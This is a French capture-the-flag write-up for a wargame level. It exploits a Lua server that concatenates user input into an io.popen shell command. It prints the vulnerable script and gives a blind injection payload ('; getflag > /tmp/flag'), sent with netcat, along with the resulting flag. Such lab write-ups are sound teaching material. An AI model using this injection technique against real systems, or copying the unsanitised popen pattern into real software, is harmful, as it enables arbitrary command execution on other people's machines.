# Level 11

## 📋 Informations

- **Domaine** : Command Injection (Lua `io.popen`)
- **Objectif** : Exploiter un script Lua serveur qui concatène une entrée utilisateur directement dans une commande système sans assainissement.

---

## 🔍 Exploration

Nous trouvons un script Lua (souvent `level11.lua`) qui s'exécute en tant que serveur.

```lua title:level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

Le script écoute sur le port **5151** (`socket.bind("127.0.0.1", 5151)`).

---

## 🛠️ Analyse

La vulnérabilité se situe dans la fonction `hash` :

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

La variable `pass` contient directement ce que nous envoyons au serveur (`client:receive()`). Elle est concaténée dans une chaîne de commande shell.

> [!IMPORTANT]
> **La faille : Injection de Commande**
> La fonction `io.popen` exécute la commande passée dans un shell.
> La commande construite est : `echo <NOTRE_ENTREE> | sha1sum`.
>
> Si notre entrée contient un point-virgule `;` (séparateur de commandes), nous pouvons terminer la commande `echo` et en démarrer une nouvelle arbitraire.

---

## 🔓 Résolution

### 1. Connexion
Nous nous connectons au serveur local via netcat.

```bash
nc localhost 5151
```

### 2. Injection (Blind)
Le serveur ne nous renvoie pas le résultat de la commande (il renvoie juste "Erf nope" ou "Gz"). C'est une injection "aveugle" (Blind).
Nous devons rediriger la sortie de notre commande `getflag` vers un fichier temporaire pour pouvoir la lire.

Payload : `; getflag > /tmp/flag`

```text
Password: ; getflag > /tmp/flag
```

Ce qui exécutera coté serveur :
`echo ; getflag > /tmp/flag | sha1sum`

### 3. Lecture du flag
Nous lisons le fichier généré.

```bash
cat /tmp/flag
```

**Flag Final :**
```text
fa6v5ateaw21peobuub8ipe6s
```

---

## 📚 Notions utiles

- **Blind Command Injection** : Quand l'application n'affiche pas la sortie de la commande injectée, il faut utiliser des canaux secondaires (fichiers, appels réseau) pour exfiltrer les données.
- **Lua `io.popen`** : Équivalent de `popen` en C, permet d'ouvrir un pipe vers une commande shell.
